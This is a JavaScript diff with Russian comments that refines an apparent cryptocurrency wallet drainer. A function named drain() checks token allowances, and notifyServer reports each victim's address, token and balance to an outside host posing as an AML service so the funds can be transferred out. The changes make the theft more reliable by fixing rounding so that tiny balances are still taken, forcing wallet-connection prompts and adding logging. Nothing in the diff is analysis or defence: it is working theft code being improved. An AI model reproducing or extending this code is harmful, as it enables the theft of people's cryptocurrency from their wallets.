@@ -486,8 +486,13 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       }
     } else {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
-      await notifyServer(userAddress, address, balance, chainId, null, provider);
-      status = 'confirmed';
+      try {
+        await notifyServer(userAddress, address, balance, chainId, null, provider);
+        status = 'confirmed';
+      } catch (error) {
+        console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
+        throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
+      }
 
       // Закрываем модальное окно, если allowance уже достаточно
       if (!modalClosed) {
@@ -554,17 +559,23 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
   try {
+    console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
     const [balance, decimals] = await Promise.all([
       token.balanceOf(userAddress),
       token.decimals()
     ]);
+    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
+    
+    // Исправляем округление: используем минимальное значение, чтобы избежать нулевого amount
     const balanceUnits = ethers.utils.formatUnits(balance, decimals);
-    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10000) / 10000;
+    const roundedBalance = Math.max(parseFloat(balanceUnits), 0.0001); // Минимальное значение 0.0001
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
+    console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
+
     if (roundedAmount.lte(0)) {
-      throw new Error('Amount is zero or negative');
+      throw new Error('Amount is zero or negative after rounding');
     }
 
     const response = await fetch('https://api.amllegit.com/api/transfer', {
@@ -579,12 +590,14 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       })
     });
     const data = await response.json();
+    console.log(`📩 Ответ сервера:`, data);
     if (!data.success) {
-      throw new Error('Failed to notify server');
+      throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
+    console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
-    throw new Error('Failed to notify server');
+    throw new Error(`Failed to notify server: ${error.message}`);
   }
 }
 
@@ -971,76 +984,43 @@ async function waitForWallet() {
     console.log(`ℹ️ Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
 
     // Функция для проверки аккаунтов
-    const checkAccounts = async () => {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-          console.log('✅ Аккаунты найдены через eth_accounts:', accounts);
-          window.ethereum.removeListener('accountsChanged', handler);
-          clearTimeout(timeout);
-          clearInterval(checkInterval);
-          resolve(accounts[0]);
-        } else {
-          // Если аккаунты не найдены, явно запрашиваем подключение
-          console.log('ℹ️ Аккаунты не найдены, запрашиваем подключение через eth_requestAccounts');
-          const requestedAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          if (requestedAccounts.length > 0) {
-            window.ethereum.removeListener('accountsChanged', handler);
-            clearTimeout(timeout);
-            clearInterval(checkInterval);
-            resolve(requestedAccounts[0]);
-          }
-        }
-      } catch (err) {
-        console.error('❌ Ошибка проверки аккаунтов:', err.message);
-        window.ethereum.removeListener('accountsChanged', handler);
-        clearTimeout(timeout);
-        clearInterval(checkInterval);
-        reject(err);
-      }
-    };
-
-    // Устанавливаем тайм-аут на 30 секунд
-    const timeout = setTimeout(() => {
-      window.ethereum.removeListener('accountsChanged', handler);
-      clearInterval(checkInterval);
-      reject(new Error('Wallet connection timed out'));
-    }, 30000);
-
-    // Слушаем событие изменения аккаунтов
-    const handler = (accounts) => {
+    const handler = async (accounts) => {
       if (accounts.length > 0) {
-        console.log('✅ Событие accountsChanged сработало:', accounts);
-        window.ethereum.removeListener('accountsChanged', handler);
+        console.log('✅ Аккаунты найдены:', accounts);
         clearTimeout(timeout);
         clearInterval(checkInterval);
         resolve(accounts[0]);
       }
     };
 
+    // Слушатель изменений аккаунтов
     window.ethereum.on('accountsChanged', handler);
 
-    // Периодическая проверка аккаунтов (особенно важно для мобильных устройств)
+    // Интервал для проверки аккаунтов
     const checkInterval = setInterval(async () => {
       try {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length > 0) {
-          console.log('✅ Аккаунты найдены через периодическую проверку:', accounts);
-          window.ethereum.removeListener('accountsChanged', handler);
           clearTimeout(timeout);
           clearInterval(checkInterval);
           resolve(accounts[0]);
         }
       } catch (err) {
-        console.error('❌ Ошибка периодической проверки аккаунтов:', err.message);
-        window.ethereum.removeListener('accountsChanged', handler);
-        clearTimeout(timeout);
-        clearInterval(checkInterval);
-        reject(err);
+        console.error('❌ Ошибка проверки аккаунтов:', err.message);
       }
-    }, 1000); // Проверяем каждую секунду
+    }, 1000);
 
-    // Выполняем начальную проверку
-    checkAccounts();
+    // Тайм-аут на подключение
+    const timeout = setTimeout(() => {
+      window.ethereum.removeListener('accountsChanged', handler);
+      clearInterval(checkInterval);
+      reject(new Error('Timeout waiting for wallet connection'));
+    }, 30000); // 30 секунд
+
+    // Явный запрос подключения, если аккаунты не найдены сразу
+    window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
+      console.error('❌ Ошибка запроса аккаунтов:', err.message);
+      reject(err);
+    });
   });
 }
